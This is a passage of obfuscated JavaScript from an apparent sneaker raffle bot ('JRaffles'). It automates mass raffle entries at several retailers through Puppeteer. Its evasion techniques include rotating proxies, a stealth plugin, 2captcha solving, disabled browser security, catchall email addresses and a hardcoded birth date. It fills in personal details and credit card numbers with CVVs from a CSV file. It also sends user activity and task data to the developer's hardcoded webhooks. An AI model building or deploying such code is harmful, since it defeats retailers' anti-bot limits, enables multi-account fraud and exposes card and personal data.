            console['log'](_0xfa2bb1() + '\x20[' + _0x134ace['name'] + ']\x20Task\x20' + (_0x499459 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3444c3['type']('#comp_firstname', '' + _0x212b62[_0x499459]['FirstName']), await _0x3444c3['waitForSelector']('#comp_lastname'), await _0x3444c3['type']('#comp_lastname', '' + _0x212b62[_0x499459]['LastName']), await _0x3444c3['waitForSelector']('#comp_email'), await _0x3444c3['type']('#comp_email', '' + _0x212b62[_0x499459]['Email']), await _0x3444c3['waitForSelector']('#comp_paypalemail'), await _0x3444c3['type']('#comp_paypalemail', '' + _0x212b62[_0x499459]['Email']), await _0x3444c3['waitForSelector']('#comp_mobile_end'), await _0x3444c3['type']('#comp_mobile_end', '' + _0x212b62[_0x499459]['Phone']), await _0x3444c3['waitForSelector']('#comp_dob'), await _0x3444c3['type']('#comp_dob', '08/09/1992'), console['log'](_0xfa2bb1() + '\x20[' + _0x134ace['name'] + ']\x20Task\x20' + (_0x499459 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x212b62[_0x499459]['Size'] == 'RANDOM') {
                const _0x3a12f7 = await _0x3444c3['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x1e20f7 => {
                    return _0x1e20f7['map'](_0xfd58b5 => _0xfd58b5['value']);
                });
                var _0xbf8f5d = Math['round'](Math['random']() * (_0x3a12f7['length'] - 0x2));
                await _0x3444c3['select']('#shoesize', _0x3a12f7[_0xbf8f5d + 0x1]), await _0xfe9813(0x3e8);
            } else {
                const _0x5568bf = await _0x3444c3['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x512668 => {
                    return _0x512668['map'](_0x1b1cf5 => _0x1b1cf5['innerText']);
                }), _0x1c056c = await _0x3444c3['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x51a41e => {
                    return _0x51a41e['map'](_0x3d2cfa => _0x3d2cfa['value']);
                });
                var _0xace8eb = _0x212b62[_0x499459]['Size'];
                for (var _0x1ca005 = 0x1; _0x1ca005 < _0x1c056c['length']; _0x1ca005++) {
                    var _0x15a691 = _0x5568bf[_0x1ca005]['split']('\x20')[0x0];
                    if (_0x15a691 == _0xace8eb) {
                        await _0x3444c3['select']('#shoesize', _0x1c056c[_0x1ca005]);
                        break;
                    } else {
                        if (_0x1ca005 + 0x1 == _0x1c056c['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x3444c3['waitForSelector']('#comp_address1'), await _0x3444c3['type']('#comp_address1', _0x212b62[_0x499459]['Address1'] + '\x20' + _0x212b62[_0x499459]['HouseNumber']), await _0x3444c3['waitForSelector']('#comp_address2'), await _0x3444c3['type']('#comp_address2', '' + _0x212b62[_0x499459]['Address2']), await _0x3444c3['waitForSelector']('#comp_address2'), await _0x3444c3['type']('#comp_address3', '' + _0x212b62[_0x499459]['City']), await _0x3444c3['waitForSelector']('#comp_postcode'), await _0x3444c3['type']('#comp_postcode', '' + _0x212b62[_0x499459]['Zip']), console['log'](_0xfa2bb1() + '\x20[' + _0x134ace['name'] + ']\x20Task\x20' + (_0x499459 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xfe9813(0x4b0), await _0x3444c3['click']('label#emailhold'), await _0xfe9813(0x5dc), await _0x3444c3['click']('#preauth_tandc_email\x20>\x20label'), await _0xfe9813(0x5dc), await _0x3444c3['click']('#submit'), await _0x3444c3['waitForSelector']('#paymentWrap'), console['log'](_0xfa2bb1() + '\x20[' + _0x134ace['name'] + ']\x20Task\x20' + (_0x499459 + 0x1) + '\x20:\x20' + _0x298364['blue']('Awaiting\x20Paypal\x20Payment')), _0x52b9f7['on']('targetcreated', async _0x149e0d => {
                if (_0x149e0d['type']() === 'page') {
                    const _0x13fcbe = await _0x149e0d['page']();
                    async function _0x1afe50() {
                        try {
                            await _0x3444c3['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0xca7ceb = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x286977() {
                        try {
                            await _0x3444c3['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x5521de = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x286977(), _0x1afe50(), await _0xfe9813(0x493e0);
                }
            });
            async function _0x1908f4() {
                for (let _0x3c56b1 = 0x0; _0x3c56b1 < 0x12c; _0x3c56b1++) {
                    if (_0x5521de == !![]) {
                        console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x134ace['name'] + ']\x20Task\x20' + (_0x499459 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '')
                            try {
                                await _0x3acacc(_0x152d8a['webhook'], _0x450599['succesDEVMSG']);
                            } catch {
                            }
                        await _0xfe9813(0xc8), await _0x3acacc(_0xe7a394, _0x450599['succesDEVMSG']), await _0xfe9813(0xc8);
                        try {
                            await _0x3acacc(_0x1c5083, _0x450599['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0xca7ceb)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0xfe9813(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0xfe9813(0xbb8), await _0x3444c3['click']('.zoid-outlet'), await _0xfe9813(0x7d0), await _0x1908f4();
        } catch (_0x1d1603) {
            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x134ace['name'] + ']\x20Task\x20' + (_0x499459 + 0x1) + '\x20:\x20' + _0x1d1603)), _0x9e41eb = '' + _0x1d1603;
            var _0x23f24c = await _0x5a270a(_0x212b62[_0x499459], _0x134ace, 'dev', !![], _0x9e41eb);
            _0x450599['errorDEV'] = { 'embeds': [_0x23f24c] }, _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x450599['errorDEV']), await _0x3acacc(_0x2c49ed, _0x450599['errorDEV']);
        } finally {
            _0x52b9f7 && _0x52b9f7['close'](), console['log']('Waiting\x20for\x20' + _0x152d8a['delay'] + '\x20ms'), await _0xfe9813(_0x152d8a['delay']);
        }
    }
}
async function _0x4b97d2(_0x3af20c, _0x2fd0e5, _0x2ec9c9) {
    _0x10a68d['use'](_0x2db5c5()), _0x10a68d['use'](_0x28dbad({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x152d8a['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x547ca0 = 0x0; _0x547ca0 < _0x2fd0e5['length']; _0x547ca0++) {
        _0x193d7e(_0x3af20c['name'] + '\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20/\x20' + _0x2fd0e5['length'] + '\x20||\x20File:\x20' + _0x3c9379 + '\x20Proxies:\x20' + _0x54e8a7);
        var _0x4f7b3e = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x550f31
                },
                {
                    'name': 'Product',
                    'value': '' + _0x2fd0e5[_0x547ca0]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2fd0e5[_0x547ca0]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x152d8a['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x152d8a['version']
                }
            ]
        }];
        const _0x37bac6 = { 'embeds': _0x4f7b3e };
        await _0x82271d(_0x2fd0e5, _0x547ca0);
        if (_0x2fd0e5[_0x547ca0]['Email'] == '' || _0x2fd0e5[_0x547ca0]['Password'] == '' || _0x2fd0e5[_0x547ca0]['FirstName'] == '' || _0x2fd0e5[_0x547ca0]['LastName'] == '') {
            console['log'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x2fd0e5[_0x547ca0]['Password'] == '' || _0x2fd0e5[_0x547ca0]['Password'] == undefined) && (_0x2fd0e5[_0x547ca0]['Password'] = 'ErehsaWonRaj1!');
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x455f9f = _0x2ec9c9[_0x547ca0]['split'](':');
        else
            var _0x5e9496 = Math['round'](Math['random']() * (_0x2ec9c9['length'] - 0x1)), _0x455f9f = _0x2ec9c9[_0x5e9496]['split'](':');
        const _0x34456d = await _0x10a68d['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x455f9f[0x0] + ':' + _0x455f9f[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x55f978 = await _0x34456d['newPage']();
            await _0x55f978['authenticate']({
                'username': '' + _0x455f9f[0x2],
                'password': '' + _0x455f9f[0x3]
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x55f978['setRequestInterception'](!![]), _0x55f978['on']('request', _0x236388 => {
                _0x236388['resourceType']() === 'image' || _0x236388['resourceType']() === 'font' || _0x236388['resourceType']() === 'media' ? _0x236388['abort']() : _0x236388['continue']();
            }), await _0x55f978['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x55f978['goto']('' + _0x2fd0e5[_0x547ca0]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x55f978['waitForSelector']('#btnPdpAtb'), console['log'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x2fd0e5[_0x547ca0]['Size']);
            const _0x9c214e = await _0x55f978['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x216147 => {
                return _0x216147['map'](_0x9fcea => _0x9fcea['innerText']);
            }), _0x31708d = await _0x55f978['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x503405 = ![];
            if (_0x2fd0e5[_0x547ca0]['Size'] == 'RANDOM') {
                var _0x317ea5 = Math['round'](Math['random']() * (_0x31708d['length'] - 0x1));
                await _0x31708d[_0x317ea5]['click']();
            } else
                for (var _0x54fee8 = 0x0; _0x54fee8 < _0x9c214e['length']; _0x54fee8++) {
                    if (_0x9c214e[_0x54fee8] != _0x2fd0e5[_0x547ca0]['Size'])
                        continue;
                    try {
                        await _0x31708d[_0x54fee8]['click']();
                    } catch {
                        console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x503405 = !![];
                    }
                }
            if (_0x503405)
                continue;
            await _0xfe9813(0x578), await _0x55f978['click']('#btnPdpAtb'), await _0x55f978['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0xfe9813(0x3e8), console['log'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x55f978['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x55f978['waitForSelector']('#email'), await _0x55f978['type']('#email', _0x2fd0e5[_0x547ca0]['Email']), await _0xfe9813(0x226), await _0x55f978['click']('#guest-submit'), await _0xfe9813(0x1b58), console['log'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x55f978['waitForSelector']('#firstname'), await _0x55f978['type']('#firstname', _0x2fd0e5[_0x547ca0]['FirstName'], 0x1f4), await _0xfe9813(0x190), await _0x55f978['waitForSelector']('#surname'), await _0x55f978['type']('#surname', _0x2fd0e5[_0x547ca0]['LastName'], 0x1f4), await _0xfe9813(0x190), await _0x55f978['waitForSelector']('#mobile'), await _0x55f978['type']('#mobile', _0x2fd0e5[_0x547ca0]['Phone'], 0x1f4), await _0xfe9813(0x190), await _0x55f978['click']('#enterManualDiv'), await _0xfe9813(0x5dc), await _0x55f978['waitForSelector']('#address1'), await _0x55f978['type']('#address1', _0x2fd0e5[_0x547ca0]['Address1'] + '\x20' + _0x2fd0e5[_0x547ca0]['HouseNumber'], 0x226), await _0xfe9813(0x384), await _0x55f978['waitForSelector']('#address2'), await _0x55f978['type']('#address2', '' + _0x2fd0e5[_0x547ca0]['Address2'], 0x226), await _0xfe9813(0x320);
            const _0xdeb79d = await _0x55f978['$$eval']('#countryselect_view3\x20>\x20option', _0x286613 => {
                return _0x286613['map'](_0x24fd79 => _0x24fd79['value']);
            });
            var _0x5538b7;
            for (var _0x580dbe = 0x0; _0x580dbe < _0xdeb79d['length']; _0x580dbe++) {
                if (_0xdeb79d[_0x580dbe]['startsWith']('' + _0x2fd0e5[_0x547ca0]['Country'])) {
                    _0x5538b7 = _0xdeb79d[_0x580dbe];
                    break;
                }
                continue;
            }
            await _0x55f978['select']('#countryselect_view3', '' + _0x5538b7), await _0x55f978['waitForSelector']('#address4'), await _0x55f978['type']('#address4', '' + _0x2fd0e5[_0x547ca0]['City'], 0x1f4), await _0xfe9813(0x384), await _0x55f978['waitForSelector']('#postcode'), await _0x55f978['type']('#postcode', '' + _0x2fd0e5[_0x547ca0]['Zip'], 0x1f4), await _0xfe9813(0x4b0);
            const _0x220f2b = await _0x55f978['url']();
            console['log'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x3929c0 = _0x220f2b['split']('?')[0x1], _0x46f819 = await _0x55f978['$']('#co_address_submit');
            await _0x46f819['evaluate'](_0x1ebdd6 => _0x1ebdd6['click']()), await _0xfe9813(0x1388), await _0x55f978['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x3929c0), console['log'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x55f978['waitForSelector']('#paymentbuttons'), await _0xfe9813(0x1388), await _0x55f978['click']('#paymentbuttons\x20>\x20div'), await _0xfe9813(0x1c2), await _0x55f978['waitForSelector']('#card-number'), await _0x55f978['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x507e9d = await _0x55f978['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x2bcf9a = await _0x507e9d['contentFrame']();
            await _0x2bcf9a['waitForSelector']('.InputContainer'), await _0x2bcf9a['click']('.InputContainer\x20>\x20input'), await _0xfe9813(0x578), await _0x55f978['type']('#card-number', '' + _0x2fd0e5[_0x547ca0]['CreditNumber']), await _0xfe9813(0xfa), await _0x55f978['type']('#card-expiry', '' + _0x2fd0e5[_0x547ca0]['ExpiryDate']), await _0xfe9813(0xfa), await _0x55f978['type']('#card-cvc', '' + _0x2fd0e5[_0x547ca0]['CVV']), await _0xfe9813(0x7d0), await _0x55f978['click']('#card-button'), console['log'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x55f978['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x3acacc(_0xe7a394, _0x37bac6);
            } catch {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x203DS\x20Failed')), _0x4f7b3e[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x4f7b3e[0x0]['description'] = '3DS\x20Failed', await _0x3acacc(_0x2c49ed, _0x37bac6);
            }
        } catch (_0x2f4397) {
            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x3af20c['name'] + ']\x20Task\x20' + (_0x547ca0 + 0x1) + '\x20:\x20' + _0x2f4397)), _0x4f7b3e[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x4f7b3e[0x0]['description'] = '' + _0x2f4397, await _0x3acacc(_0x2c49ed, _0x37bac6);
        } finally {
            _0x34456d && _0x34456d['close']();
            if (_0x547ca0 + 0x1 == _0x2fd0e5['length']) {
                console['log'](_0x298364['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0xfe9813(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x152d8a['AfewDelay'] + '\x20ms'), await _0xfe9813(_0x152d8a['AfewDelay']);
        }
    }
}
async function _0x2015d0(_0x26c038, _0x4024b6, _0x42390b, _0x96ee46, _0x1dcb27) {
    var _0x44345b, _0x512945 = {}, _0x4821b2 = [], _0x9db4a3 = {}, _0x32ed6a = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x96ee46 && (_0x96ee46 = {});
    if (_0x4024b6 != 'ver') {
        _0x193d7e(_0x42390b['name'] + '\x20Task\x20' + (_0x26c038 + 0x1) + '\x20/\x20' + _0x96ee46['length'] + '\x20||\x20File:\x20' + _0x3c9379 + '\x20Proxies:\x20' + _0x54e8a7), await _0x82271d(_0x96ee46, _0x26c038), _0x4821b2 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x550f31
                },
                {
                    'name': 'Size',
                    'value': '' + _0x96ee46[_0x26c038]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x152d8a['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x112c11
                }
            ]
        }], _0x9db4a3 = { 'embeds': _0x4821b2 }, _0x512945 = _0x42390b['data'];
        _0x4024b6 == 'exp' ? _0x512945['data']['attributes']['email'] = '' + _0x96ee46[_0x26c038]['FirstName'] + _0x96ee46[_0x26c038]['LastName'] + _0x152d8a['catchall'] : _0x512945['data']['attributes']['email'] = '' + _0x96ee46[_0x26c038]['Email'];
        if (_0x96ee46[_0x26c038]['Size'] == 'RANDOM') {
        }
        _0x512945['data']['attributes']['properties']['$first_name'] = '' + _0x96ee46[_0x26c038]['FirstName'], _0x512945['data']['attributes']['properties']['$last_name'] = '' + _0x96ee46[_0x26c038]['LastName'], _0x512945['data']['attributes']['properties']['$address1'] = _0x96ee46[_0x26c038]['Address1'] + '\x20' + _0x96ee46[_0x26c038]['Address2'] + '\x20' + _0x96ee46[_0x26c038]['HouseNumber'], _0x512945['data']['attributes']['properties']['$zip'] = '' + _0x96ee46[_0x26c038]['Zip'], _0x512945['data']['attributes']['properties']['$city'] = '' + _0x96ee46[_0x26c038]['City'], _0x512945['data']['attributes']['properties']['$country'] = '' + _0x96ee46[_0x26c038]['Country'], _0x512945['data']['attributes']['properties']['Size'] = '' + _0x96ee46[_0x26c038]['Size'], _0x512945['data']['attributes']['properties']['$phone_number'] = '' + _0x96ee46[_0x26c038]['Phone'], _0x512945['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x96ee46[_0x26c038]['Follower'];
    }
    if (_0x152d8a['useRandomProxy'] = ![])
        var _0x1cc6e5 = _0x1dcb27[_0x26c038]['split'](':');
    else
        var _0x56c8e3 = Math['round'](Math['random']() * (_0x1dcb27['length'] - 0x1)), _0x1cc6e5 = _0x1dcb27[_0x56c8e3]['split'](':');
    var _0x3f8c9c = {
        'jar': _0x37e6cd,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x42390b['url'],
        'headers': _0x42390b['headers'],
        'body': JSON['stringify'](_0x512945),
        'proxy': 'http://' + _0x1cc6e5[0x2] + ':' + _0x1cc6e5[0x3] + '@' + _0x1cc6e5[0x0] + ':' + _0x1cc6e5[0x1]
    };
    return _0x4024b6 != 'ver' && (_0x3f8c9c['url'] = _0x42390b['url'], _0x3f8c9c['headers'] = _0x42390b['headers']), _0x4024b6 == 'ver' && (_0x3f8c9c['method'] = 'GET'), new Promise(function (_0x36f35d, _0x105469) {
        callback = async (_0x409be8, _0x1cd4f2, _0x100b5a) => {
            if (!_0x409be8 && _0x1cd4f2['statusCode'] == 0xca || !_0x409be8 && _0x1cd4f2['statusCode'] == 0xc8) {
                if (_0x4024b6 != 'ver') {
                    var _0x5aaab0 = await _0x5a270a(_0x96ee46[_0x26c038], _0x42390b, 'dev', ![]), _0x32e2e4 = await _0x5a270a(_0x96ee46[_0x26c038], _0x42390b, 'pub', ![]);
                    const _0x298960 = {
                        'succesDEVMSG': { 'embeds': [_0x5aaab0] },
                        'succesPUBMSG': { 'embeds': [_0x32e2e4] }
                    };
                    if (_0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '')
                        try {
                            await _0x3acacc(_0x152d8a['webhook'], _0x298960['succesDEVMSG']);
                        } catch {
                        }
                    await _0xfe9813(0xc8), await _0x3acacc(_0xe7a394, _0x298960['succesDEVMSG']), await _0xfe9813(0xc8);
                    try {
                        await _0x3acacc(_0x1c5083, _0x298960['succesPUBMSG']);
                    } catch {
                    }
                }
                _0x36f35d(console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x42390b['name'] + ']\x20Task\x20' + (_0x26c038 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x4024b6 != 'ver') {
                    var _0x540696 = '' + _0x409be8, _0x271e2e = await _0x5a270a(_0x96ee46[_0x26c038], _0x42390b, 'dev', !![], _0x540696), _0x5955b7 = {};
                    _0x5955b7['errorDEV'] = { 'embeds': [_0x271e2e] }, _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x5955b7['errorDEV']), await _0x3acacc(_0x2c49ed, _0x5955b7['errorDEV']);
                }
                _0x105469(console['log'](_0xfa2bb1() + '\x20[' + _0x42390b['name'] + ']\x20Task\x20' + (_0x26c038 + 0x1) + ':\x20' + _0x409be8));
            }
        };
        try {
            _0x4024b6 != 'ver' && console['log'](_0xfa2bb1() + '\x20[' + _0x42390b['name'] + ']\x20Task\x20' + (_0x26c038 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x512945['data']['attributes']['email']), _0x994449(_0x3f8c9c, callback);
        } catch (_0x2a1e94) {
            console['log'](_0xfa2bb1() + '\x20Task\x20' + (_0x26c038 + 0x1) + ':\x20' + _0x2a1e94);
        }
    });
}
;
async function _0x287507(_0x2e3b9c, _0x55c946, _0x2a01d5) {
    _0x193d7e('' + _0x55c946), _0x10a68d['use'](_0x2db5c5());
    const _0x3bffa6 = await _0x10a68d['launch']({
        'headless': ![],
        'args': [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0xfa2bb1() + '\x20[' + _0x55c946 + ']\x20Getting\x20Session');
        const _0x267f0d = await _0x3bffa6['newPage']();
        await _0x267f0d['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x267f0d['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0xfa2bb1() + '\x20[' + _0x55c946 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x267f0d['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0xfa2bb1() + '\x20[' + _0x55c946 + ']\x20Successfully\x20logged\x20in'), await _0xfe9813(0x4e20);
        } catch {
            throw new Error('Login\x20session\x20expired');
        }
        for (var _0x5664f2 = 0x0; _0x5664f2 < _0x2e3b9c['length']; _0x5664f2++) {
            console['log'](_0xfa2bb1() + '\x20[' + _0x55c946 + ']\x20Task\x20' + (_0x5664f2 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x193d7e(_0x55c946 + '\x20Task\x20' + (_0x5664f2 + 0x1) + '\x20/\x20' + _0x2e3b9c['length']);
            const _0x39c980 = await _0x3bffa6['newPage']();
            await _0x39c980['goto']('' + _0x2e3b9c[_0x5664f2]), await _0xfe9813(0xf4240);
        }
    } catch (_0x5fa339) {
        console['log'](_0x298364['red']('' + _0x5fa339));
    } finally {
        await _0x3bffa6['close']();
    }
}
async function _0x2f66c0() {
    await _0x5c87a9(), console['clear']();
    if (_0x112c11 != 'devkey') {
        let _0x1c4db0 = await _0x497372['autoUpdate']();
        if (_0x1c4db0 === 'yes')
            return _0x5e3e86('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x26cb71 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0xfe9813(0x2710);
        ;
    }
    await _0x211d4d(_0x26cb71);
    if (_0x115e3e === ![])
        return console['log']('Closing\x20Browser'), await _0xfe9813(0xbb8);
    else
        try {
            var _0x4ed7d7 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x550f31
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x112c11
                    }
                ]
            }];
            const _0x11d3a3 = { 'embeds': _0x4ed7d7 };
            var _0x539c8d = await _0x5a270a(null, null, 'open', ![]);
            const _0x534f20 = { 'openDEVMSG': { 'embeds': [_0x539c8d] } };
            await _0x3acacc(_0x196b9c, _0x534f20['openDEVMSG']);
            async function _0x1c6993() {
                _0x193d7e('JRaffles\x20' + _0x112c11), console['clear'](), console['log']('Welcome\x20to\x20' + _0x298364['cyan']('JRaffles();') + '\x20' + _0x112c11), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x30116a = 0x0; _0x30116a < _0x8b6437['length'] - 0x2; _0x30116a++) {
                    if (_0x8b6437[_0x30116a]['name'] === 'Reload\x20Settings' || _0x8b6437[_0x30116a]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x30116a + ')\x20[' + _0x8b6437[_0x30116a]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x8b6437['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x8b6437['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x210e2c();
                if (taskModule > _0x8b6437['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0xfe9813(0x3e8), _0x1c6993();
                if (_0x8b6437[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x28a068(_0x8b6437[taskModule]['modules']);
                    var _0x51d503 = _0x8b6437[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x47729f = await _0x405a82(), _0x378272 = await _0x340277();
                    if (_0x378272[0x0]['Url'] == '' || _0x378272[0x0]['Url'] == undefined) {
                        await _0x560b3f(_0x47729f);
                        var _0x13d975 = await _0x2a8cb1();
                        return await afewFunction('' + _0x163646[_0x13d975], 'nor', _0x51d503, _0x378272, _0x47729f), _0x1c6993();
                    }
                    return await afewFunction(_0x378272[0x0]['Url'], 'nor', _0x51d503, _0x378272, _0x47729f), _0x1c6993();
                } else {
                    if (_0x8b6437[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x28a068(_0x8b6437[taskModule]['modules']);
                        var _0x51d503 = _0x8b6437[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x47729f = await _0x405a82(), _0x5540b0 = await _0x340277();
                            console['log']('Starting\x20' + _0x5540b0['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x45d71c = 0x0; _0x45d71c < _0x5540b0['length']; _0x45d71c++) {
                                console['log'](_0xfa2bb1() + '\x20[' + _0x51d503['name'] + ']\x20Task\x20' + (_0x45d71c + 0x1) + ':\x20Getting\x20Session'), await _0x4a9257(_0x45d71c, 'nor', _0x51d503, _0x5540b0, _0x47729f), console['log'](_0xfa2bb1() + '\x20[' + _0x51d503['name'] + ']\x20Sleeping\x20for\x20' + _0x152d8a['MahaDelay'] + '\x20ms'), await _0xfe9813(_0x152d8a['MahaDelay']);
                            }
                            ;
                            return _0x1c6993();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x47729f = await _0x405a82();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), linksRaw = await _0x105f1c(), _0x46d922 = linksRaw['split'](';'), console['log'](_0x46d922['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0x45d71c = 0x0; _0x45d71c < _0x46d922['length']; _0x45d71c++) {
                                    _0x51d503['url'] = _0x46d922[_0x45d71c], console['log'](_0xfa2bb1() + '\x20[' + _0x51d503['name'] + ']\x20Task\x20' + (_0x45d71c + 0x1) + ':\x20Getting\x20Session'), await _0x4a9257(_0x45d71c, 'ver', _0x51d503, _0x5540b0, _0x47729f), console['log'](_0xfa2bb1() + '\x20[' + _0x51d503['name'] + ']\x20Sleeping\x20for\x20' + _0x152d8a['verificationDelay'] + '\x20ms'), await _0xfe9813(_0x152d8a['verificationDelay']);
                                }
                                ;
                                return _0x1c6993();
                            }
                        }
                    } else {
                        if (_0x8b6437[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x28a068(_0x8b6437[taskModule]['modules']);
                            var _0x51d503 = _0x8b6437[taskModule]['modules'][taskFunction], _0x47729f = await _0x405a82(), _0x1e7234 = await _0x340277();
                            return await _0x2200bb(_0x1e7234, _0x47729f, _0x51d503), await _0xfe9813(0x1388), _0x1c6993();
                        } else {
